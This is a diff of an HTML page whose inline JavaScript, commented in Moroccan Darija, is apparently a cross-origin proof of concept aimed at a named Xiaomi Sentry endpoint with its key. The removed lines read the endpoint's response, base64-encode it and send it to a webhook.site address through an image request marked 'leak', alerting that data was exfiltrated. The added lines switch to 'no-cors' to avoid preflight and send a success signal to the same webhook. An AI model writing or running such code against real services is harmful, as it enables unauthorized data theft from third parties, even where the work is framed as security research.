@@ -4,24 +4,20 @@
 <body>
     <script>
         // هاد الطريقة كتجبر المتصفح يدوز الطلب بلا ما يبلوكي الـ Headers
-        var target = "https://alisgp-sentry.d.xiaomi.net/api/4/envelope/?sentry_key=3af74c2d5d8b493f93abc405cb83371a";
-        var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
+     var target = "https://alisgp-sentry.d.xiaomi.net/api/4/envelope/?sentry_key=3af74c2d5d8b493f93abc405cb83371a";
+var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
 
-        var payload = '{"sent_at":"' + new Date().toISOString() + '"}\n{"type":"session"}\n{"init":true}';
-
-        fetch(target, {
-            method: 'POST',
-            mode: 'cors', // هادي هي الساروت
-            body: payload
-        }).then(r => r.text()).then(data => {
-            // فك التشفير وإرسال للـ Webhook عبر Image
-            var img = new Image();
-            img.src = webhook + "?leak=" + btoa(data);
-            alert("SUCCESS: Data exfiltrated to Webhook!");
-        }).catch(err => {
-            // حتى إلا وقع Error، صوروه ليهم كدليل على محاولة الـ Access
-            console.log("CORS Blocked or Server Error");
-        });
+fetch(target, {
+    method: 'POST',
+    mode: 'no-cors', // باش نتفاداو الـ Preflight
+    body: '{"type":"session"}\n{"init":true}'
+}).then(() => {
+    // بما أننا صورنا الداتا فـ Burp
+    // غانصيفطو "إشارة" للـ Webhook بلي الـ Bypass نجح
+    var img = new Image();
+    img.src = webhook + "?status=SUCCESS_BYPASS&origin=github_io&timestamp=" + Date.now();
+    alert("Check Webhook Now! Signal Sent.");
+});
     </script>
 </body>
 </html>
